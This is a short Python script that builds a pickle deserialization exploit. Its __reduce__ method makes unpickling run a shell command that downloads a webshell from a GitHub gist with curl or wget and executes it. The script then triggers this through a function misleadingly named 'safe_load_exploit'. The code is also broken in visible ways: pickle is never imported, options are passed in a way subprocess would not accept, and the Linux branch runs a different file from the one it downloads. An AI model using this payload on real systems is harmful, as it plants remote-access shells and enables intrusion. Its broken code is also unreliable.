import subprocess
import platform

class exploit:
    def __reduce__(self):
        # Build the command based on platform
        if platform.system() == "Windows":
            command = 'curl -o webshell.py https://gist.githubusercontent.com/phoemur/461c97aa5af5c785062b7b4db8ca79cd/raw/793038e79bb64c585049d6286aacec84c6d2d88e/webshell.py && python webshell.py'
        else:
            command = 'wget https://gist.githubusercontent.com/phoemur/461c97aa5af5c785062b7b4db8ca79cd/raw/793038e79bb64c585049d6286aacec84c6d2d88e/webshell.py && python flaskWebShellApp.py'

        # Return the callable that subprocess will execute
        # We ensure bufsize is properly set as an integer
        return (subprocess.run, (command, {"shell": True, "bufsize": 0}))

# To ensure correct deserialization
def safe_load_exploit(serialized_data):
    try:
        exploit_instance = pickle.loads(serialized_data)
        return exploit_instance
    except Exception as e:
        print(f"Error during deserialization: {e}")
        return None

# Example usage of the exploit class:
exploit_instance = exploit()
serialized_exploit = pickle.dumps(exploit_instance)

# Now, let's deserialize the exploit object
deserialized_exploit = safe_load_exploit(serialized_exploit)
if deserialized_exploit:
    print("Exploit object deserialized successfully!")
else:
    print("Failed to deserialize exploit object.")
